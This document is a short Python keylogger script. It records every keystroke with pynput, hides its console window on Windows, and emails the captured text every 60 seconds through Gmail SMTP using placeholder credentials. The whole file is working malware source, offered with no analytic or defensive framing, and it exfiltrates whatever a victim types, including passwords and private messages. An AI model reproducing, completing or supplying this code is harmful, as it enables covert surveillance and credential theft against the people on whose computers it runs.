import pynput.keyboard
import threading
import smtplib
import os

log = ""
email = "your_email@gmail.com"  # Replace
password = "your_app_password"  # Use app password for Gmail
server = smtplib.SMTP("smtp.gmail.com", 587)
server.starttls()
server.login(email, password)

def send_email():
    global log
    server.sendmail(email, email, log)
    log = ""
    threading.Timer(60, send_email).start()  # Send every 60 sec

def on_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += f" [{key}] "

def hide():
    if os.name == "nt":
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

if __name__ == "__main__":
    hide()
    send_email()
    with pynput.keyboard.Listener(on_press=on_press) as listener:
        listener.join()
